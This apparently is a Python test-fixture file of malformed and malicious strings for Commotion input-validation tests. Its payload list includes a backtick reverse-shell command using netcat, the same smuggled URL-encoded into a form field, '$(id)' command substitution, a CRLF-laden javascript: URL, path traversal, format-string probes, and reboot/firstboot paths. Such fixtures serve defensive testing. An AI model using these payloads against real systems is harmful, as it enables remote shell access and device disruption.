# coding=utf-8
"""Malicious, incorrect, and/or plausible strings for use in Commotion
input validation tests"""
from __future__ import unicode_literals
import random

# To do: make sure these strings are not being escaped in transit

SPECIAL_CHARS = [
    '%',
    '`',
    "'",
    '$',
    '&',
    '*',
    '(',
    ')',
    '{',
    '}',
    ';',
    '?',
    '\\',
]

WHITESPACE = [
    "\n",
    "\t",
    " ",
    "\f",
    "\r",
    "\v",
]

def gen_special_string(num):
    """Generate a string of arbitrary length using the 
    SPECIAL_CHARS array"""
    sp_string = ''.join(random.sample(SPECIAL_CHARS, num))
    return sp_string

def gen_long_string(num):
    """Generate a simple string of arbitrary length"""
    l_string = 'a' * num
    return l_string

MALICIOUS_STRINGS = [
    '', # No value
    gen_long_string(257), # Too long
    gen_special_string(5), # Special characters
    random.choice(WHITESPACE),
    "`nc\t-e\tsh\t192.168.1.254\t4444`",
    'name=jjgjunique&description=jjj&ipaddr=127.0.0.5&uuid=%60nc%09-e%09sh%09192.168.1.254%094444%60&type=Community&icon=%2Ficon&port=80&ttl=0',
    '$(id)',
    'javascript://127.0.0.1/?%0d%0aalert(document.domain)',
    '../../../README.md%20',
    'AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x',
    '0.0.0.0',
    '-124.134.23.1',
    '2000::',
    '::',
    # http://farmdev.com/talks/unicode/
    ' £ € « » ♠ ♣ ♥ ♦ ¿ �', # \xc2 (&nbsp;) Causes encoding error.
    '{ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,a,a,a,a,a,a,a,a }',
    './sbin/reboot',
    './sbin/firstboot',
    '(╯°□°）╯︵ ┻━┻',
    '65537',
    '1',
    '-1',
    '-666',
    '6553-6555',
    '5-100',
    'root',
    'meat',
    #Protocols & Paths:
    #http://
    #https://
    #/foo/bar/baz/

    #Machines
    #IP address
    #hostname
    #fqdn
    #url
]
